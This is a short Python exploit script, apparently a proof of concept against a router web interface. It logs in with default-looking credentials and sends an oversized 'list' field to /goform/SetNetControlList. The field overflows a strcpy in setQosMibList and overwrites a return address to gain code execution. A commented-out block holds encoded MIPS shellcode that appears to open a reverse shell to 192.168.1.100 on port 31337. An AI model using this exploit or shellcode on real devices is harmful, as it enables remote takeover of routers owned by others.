#!/usr/bin/env python3

# bof in setQosMibList - 0x498c74, using strcpy to trigger and get rce

import common, socket

t = common.Tendown('192.168.0.1', '80', 'user', 'user')
t.login()
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('192.168.0.1', 80))
shell = b';111'
'''
#sample shell
c = b'\x24\x0f\xff\xfd\x01\xe0\x20\x27\x01\xe0\x28\x27\x28\x06\xff\xff\x24\x02\x10\x57\x01\x01\x01\x0c\xaf\xa2\xff\xff\x8f\xa4\xff\xff\x24\x0f\xff\xfd\x01\xe0\x78\x27\xaf\xaf\xff\xe0\x3c\x0e\x7a\x69\x35\xce\x7a\x69\xaf\xae\xff\xe4\x3c\x0d\xc0\xa8\x35\xad\x01\x64\xaf\xad\xff\xe6\x23\xa5\xff\xe2\x24\x0c\xff\xef\x01\x80\x30\x27\x24\x02\x10\x4a\x01\x01\x01\x0c\x24\x0f\xff\xfd\x01\xe0\x28\x27\x8f\xa4\xff\xff\x24\x02\x0f\xdf\x01\x01\x01\x0c\x20\xa5\xff\xff\x24\x01\xff\xff\x14\xa1\xff\xfb\x28\x06\xff\xff\x3c\x0f\x2f\x2f\x35\xef\x62\x69\xaf\xaf\xff\xf4\x3c\x0e\x6e\x2f\x35\xce\x73\x68\xaf\xae\xff\xf8\xaf\xa0\xff\xfc\x27\xa4\xff\xf4\x28\x05\xff\xff\x24\x02\x0f\xab\x01\x01\x01\x0c'
for i in range(0, len(c), 4):
	shell+=c[i:i+4][::-1]
'''
shell += b';;;;'
shell = shell.ljust(0x8b8, b'a')
shell += b'\x80\xec\x40\x00'
p = {'list':shell}
t.post_request('/goform/SetNetControlList', p)
